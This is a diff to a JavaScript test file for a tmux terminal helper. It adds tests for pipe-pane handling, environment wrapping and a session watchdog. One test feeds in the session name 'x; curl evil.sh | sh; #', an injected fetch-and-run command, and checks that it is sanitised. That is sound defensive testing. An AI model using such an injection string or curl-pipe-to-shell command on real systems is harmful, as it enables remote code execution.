@@ -108,7 +108,10 @@ test("setup creates the session with the requested geometry and log wiring", asy
 	await openTmuxPty(target, { session: "sized", cols: 133, rows: 42 });
 	const setup = target.execCalls[0];
 	assert.match(setup, /new-session -d -s 'sized' -x 133 -y 42/);
-	assert.match(setup, /pipe-pane -o -t 'sized'/);
+	// -o toggles, so re-running it on a reattach closes the pipe and the
+	// terminal goes silent. Verified on a live sandbox; never reintroduce.
+	assert.match(setup, /pipe-pane -t 'sized'/);
+	assert.ok(!setup.includes("pipe-pane -o"), "pipe-pane -o toggles the pipe off");
 	assert.match(setup, /has-session -t 'sized'/);
 	assert.ok(!setup.includes("\n"), "setup must stay a single shell line");
 });
@@ -125,4 +128,58 @@ test("setup failure surfaces the exit code and output", async () => {
 		openTmuxPty(target, { session: "broken" }),
 		/exit 127.*tmux: not found/s,
 	);
+});
+
+test("session names cannot escape the shell and never contain spaces", async () => {
+	const target = recorder();
+	await openTmuxPty(target, { session: "x; curl evil.sh | sh; #" });
+	const setup = target.execCalls[0];
+	assert.ok(
+		!setup.includes("curl evil.sh"),
+		"a hostile session name must not reach the shell as code",
+	);
+	// Every unsafe character becomes a dash, so the name is inert both as
+	// a tmux target and inside the log path.
+	assert.match(setup, /-s 'x--curl-evil\.sh---sh---'/);
+	assert.match(setup, /\/tmp\/am-mux-x--curl-evil\.sh---sh---\.log/);
+
+	const spaced = recorder();
+	await openTmuxPty(spaced, { session: "my session" });
+	assert.match(spaced.execCalls[0], /\/tmp\/am-mux-my-session\.log/);
+});
+
+test("an interactive command runs through env + sh -c, not an assignment prefix", async () => {
+	const target = recorder();
+	await openTmuxPty(target, {
+		session: "agent",
+		command: "{ export PATH=/x:$PATH; claude; }",
+		env: { ANTHROPIC_API_KEY: "sk-test", IS_SANDBOX: "1" },
+	});
+	const setup = target.execCalls[0];
+	// A variable-assignment prefix in front of a brace group is a shell
+	// syntax error, which silently broke `am mux term`.
+	assert.ok(
+		!/ANTHROPIC_API_KEY='sk-test' IS_SANDBOX='1' \{/.test(setup),
+		"env must not be an assignment prefix on a compound command",
+	);
+	// The whole `env ... sh -c '<command>'` string is one tmux argument, so
+	// its inner quotes arrive escaped.
+	assert.match(setup, /env ANTHROPIC_API_KEY=/);
+	assert.match(setup, /IS_SANDBOX=/);
+	assert.match(setup, /sh -c /);
+	assert.match(setup, /export PATH=\/x:\$PATH; claude;/);
+});
+
+test("the output tail stops when the remote session goes away", async () => {
+	const target = recorder();
+	const pty = await openTmuxPty(target, { session: "watched" });
+	for await (const _bytes of pty.output) {
+		void _bytes;
+	}
+	const tail = target.streamCalls[0];
+	// Without a watchdog, `tail -f` never ends and both the consumer and
+	// `exited` hang after the session dies.
+	assert.match(tail, /while tmux has-session -t 'watched'/);
+	assert.match(tail, /kill \$TAILPID/);
+	assert.equal(await pty.exited, null);
 });
